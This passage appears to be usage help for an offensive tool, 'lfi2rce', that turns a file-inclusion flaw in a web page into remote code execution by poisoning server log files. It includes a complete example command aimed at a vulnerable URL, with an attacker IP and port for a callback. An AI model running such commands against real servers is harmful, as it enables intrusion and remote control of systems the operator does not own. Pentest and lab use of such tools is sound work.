...
Force to poison other log file:

          --log <file to poison>

Force log file usage:

          python3 lfi2rce <lfi vulnerable url> <poison type> <attacker ip> <attacker port> --log <file to poison>

Example:

          python3 lfi2rce "http://ghost.server/index.php?file=" apache 10.0.2.15 1337 --log /proc/self/fd/8
